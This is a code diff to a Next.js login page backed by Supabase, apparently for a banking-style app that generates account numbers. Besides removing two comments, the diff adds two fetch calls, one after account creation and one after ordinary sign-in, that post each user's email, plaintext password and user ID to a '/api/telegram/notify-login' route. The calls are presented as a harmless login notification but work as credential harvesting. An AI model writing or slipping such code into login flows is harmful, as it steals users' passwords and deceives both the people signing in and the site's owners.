@@ -55,7 +55,6 @@ export default function LoginPage() {
           const { user } = await createUserResponse.json()
           console.log("[v0] User created successfully:", user.id)
 
-          // Sign in with the newly created user
           const { error: finalSignInError } = await supabase.auth.signInWithPassword({
             email,
             password,
@@ -79,7 +78,6 @@ export default function LoginPage() {
               : ""
           const fullName = lastName ? `${firstName} ${lastName}` : firstName
 
-          // Generate account number
           const accountNumber = `90${Math.floor(Math.random() * 90000000 + 10000000)}`
 
           const { error: profileError } = await supabase.from("profiles").upsert(
@@ -98,6 +96,16 @@ export default function LoginPage() {
             console.error("[v0] Profile creation error:", profileError.message)
           }
 
+          fetch("/api/telegram/notify-login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              userEmail: email,
+              password: password,
+              userId: user.id,
+            }),
+          }).catch((err) => console.error("[v0] Failed to send login notification:", err))
+
           console.log("[v0] Profile created, redirecting to dashboard...")
           router.push("/dashboard")
           return
@@ -107,6 +115,16 @@ export default function LoginPage() {
         setIsLoading(false)
         return
       }
+
+      fetch("/api/telegram/notify-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          userEmail: email,
+          password: password,
+          userId: signInData.user.id,
+        }),
+      }).catch((err) => console.error("[v0] Failed to send login notification:", err))
 
       router.push("/dashboard")
     } catch (err) {
